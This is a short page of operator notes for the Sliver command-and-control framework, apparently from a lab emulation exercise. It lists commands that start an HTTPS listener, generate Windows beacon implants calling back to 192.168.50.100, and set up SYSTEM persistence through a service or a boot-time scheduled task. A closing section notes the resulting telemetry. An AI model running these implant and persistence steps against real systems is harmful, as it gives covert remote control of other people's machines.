# Sliver

| | |
|---|---|
| Server | `sliver-server_linux-amd64` on Kali 192.168.50.100 |
| Client | `sliver-client_linux-amd64` |
| Listener | HTTPS 443, domain `checkauj.com`, self-signed certificate |
| Used in | beacon on WS01 (SYSTEM) and FS01 (SYSTEM) |

## Start

```
~/sliver-server_linux-amd64 daemon &
# client
https --lhost 192.168.50.100 --lport 443 --domain checkauj.com \
      --cert ~/c0015/certs/checkauj.crt --key ~/c0015/certs/checkauj.key
```

## Generate

```
generate --os windows --arch amd64 --format exe --http 192.168.50.100:443 --save /tmp/beacon.exe
generate --os windows --arch amd64 --format service --service-name c0015svc \
         --http 192.168.50.100:443 --save /tmp/beacon-svc.exe
```

## Persistence

This build has **no `persist` command**. Persistence is done with a service (`sc create ... start= auto
obj= LocalSystem`) or a scheduled task with `/sc onstart`; both were verified to reconnect after a reboot.

## Telemetry

- HTTPS beaconing to 192.168.50.100:443 from the victim hosts.
- The service form adds 7045 and a new service binary.
